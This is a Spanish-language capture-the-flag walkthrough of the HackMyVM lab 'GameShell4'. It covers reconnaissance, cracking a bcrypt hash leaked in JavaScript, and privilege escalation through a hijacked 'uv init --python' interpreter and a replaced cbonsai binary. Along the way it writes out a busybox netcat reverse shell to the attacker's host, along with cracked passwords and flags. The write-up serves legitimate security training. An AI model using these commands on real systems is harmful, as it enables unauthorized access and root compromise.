# 🖥️ GameShell4 - HackMyVM / VirtualBox

> **Dificultad:** Media  
> **OS:** Debian  
> **IP:** 192.168.0.16  
> **Fecha:** 2026-04-13

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 192.168.0.16
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 |
| 79/tcp | finger | OpenBSD fingerd |
| 80/tcp | HTTP | Apache 2.4.62 |

> ⭐ Puerto 79 (finger) — protocolo antiguo de los 80s que expone información de usuarios del sistema

```bash
finger @192.168.0.16
finger root@192.168.0.16
```

---

## 🌐 Enumeración Web

Página de inicio con animación canvas — título "Hidden Server".

**Pista crítica en el código fuente JavaScript:**

```javascript
console.log("admin:$2y$05$yKwD7W0PUqg9EGrSRQP2AegLrBvwLaUDlYEQ859O/ki01I54LnReS");
```

Hash bcrypt del usuario `admin` oculto en un `console.log()` — visible solo en las DevTools del navegador.

---

## 🔓 Crackeo de hash — admin

```bash
echo '$2y$05$yKwD7W0PUqg9EGrSRQP2AegLrBvwLaUDlYEQ859O/ki01I54LnReS' > hash_admin
john hash_admin --wordlist=/usr/share/wordlists/rockyou.txt
# Resultado: babylove3
```

---

## 🔑 Acceso inicial — SSH como admin

```bash
ssh admin@192.168.0.16
# password: babylove3
```

`admin` no tiene sudo. Enumeramos SUID y procesos:

```bash
find / -perm -4000 -user root 2>/dev/null
ps aux
```

**Hallazgo clave en ps aux:**
```
root  366  sudo -u xcm ttyd -i 127.0.0.1 -p 7681 -H X-Forwarded-User -W sudoku.sh
```

Terminal web ttyd corriendo como `xcm` en puerto 7681 — solo accesible desde localhost.

**Configuración Apache:**

```bash
cat /etc/apache2/sites-enabled/*
# /sudoku → proxy inverso a ttyd con autenticación básica
cat /etc/apache2/.htpasswd
# admin:$2y$05$... → misma contraseña babylove3
```

---

## 🎮 Sudoku — obtener usuario xcm

Accede a `http://192.168.0.16/sudoku` con `admin:babylove3`.

Aparece un juego de Sudoku en terminal. Al completarlo:

```
GAME COMPLETED!
SUDOKUISMAGIC
```

**⭐ Lección importante:** La contraseña es `sudokuismagic` en **minúsculas** — no la cadena exacta en mayúsculas.

**Solución del Sudoku** (generada con script Python):

```
122 133 141 159 168 176
239 245 254 272 293
317 324 346 352 385 391
418 443 469 477 484 496
511 523 537 575 582 599
619 626 634 647 662 698
712 727 758 766 783 795
814 835 853 861 878
936 944 957 965 971 989
```

```bash
ssh xcm@192.168.0.16
# password: sudokuismagic
```

**Flag user:**
```
flag{user-602d9cd809f3b29eae8bc042bdf6c1ca}
```

---

## ⬆️ Escalada xcm → sdk — Python interpreter hijacking via uv

```bash
sudo -l
# (sdk) NOPASSWD: /usr/local/bin/uv init *, /usr/local/bin/uv help *
```

**Técnica:** `uv init` acepta `--python` para especificar el intérprete. Creamos un fake interpreter que ejecuta comandos como sdk antes de llamar al Python real:

```bash
cat > /tmp/fakepy.sh << 'EOF'
#!/bin/sh
id > /tmp/sdk_out.txt 2>&1
python3 "$@"
EOF
chmod +x /tmp/fakepy.sh

cd /tmp
sudo -u sdk /usr/local/bin/uv init /tmp/uvproj --python /tmp/fakepy.sh --bare --no-workspace
cat /tmp/sdk_out.txt
# uid=1002(sdk)
```

**Reverse shell como sdk:**

```bash
# En Kali
nc -lvnp 4444

# En la máquina víctima
cat > /tmp/fakepy.sh << 'EOF'
#!/bin/sh
busybox nc 192.168.0.13 4444 -e /bin/bash &
python3 "$@"
EOF
chmod +x /tmp/fakepy.sh
rm -rf /tmp/uvproj2
sudo -u sdk /usr/local/bin/uv init /tmp/uvproj2 --python /tmp/fakepy.sh --bare --no-workspace
```

---

## ⬆️ Escalada sdk → root — cbonsai hijacking

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/livescreen
```

`livescreen` ejecuta internamente `/usr/games/cbonsai`. Sustituimos cbonsai:

```bash
echo '/bin/bash -p' > /usr/local/bin/cbonsai
chmod +x /usr/local/bin/cbonsai
sudo /usr/local/bin/livescreen
whoami  # root
```

**Flag root:**
```
flag{root-983b0f2b5412aadd94ed08f249355686}
```

---

## 📝 Lecciones aprendidas

- ⭐ **Revisar siempre el código fuente** y las DevTools del navegador — los `console.log()` pueden contener credenciales
- **Puerto 79 (finger)** — protocolo obsoleto pero útil para enumerar usuarios
- **ttyd** = terminal web que puede exponer shells de otros usuarios via proxy Apache
- El Sudoku era la clave para obtener la contraseña de xcm — `SUDOKUISMAGIC` → `sudokuismagic`
- **uv init --python** = vector de escalada cuando se puede ejecutar como otro usuario
- **cbonsai hijacking** — si un script sudo ejecuta un binario con PATH relativo, se puede sustituir
- Escalada en 3 pasos: `admin → xcm → sdk → root`
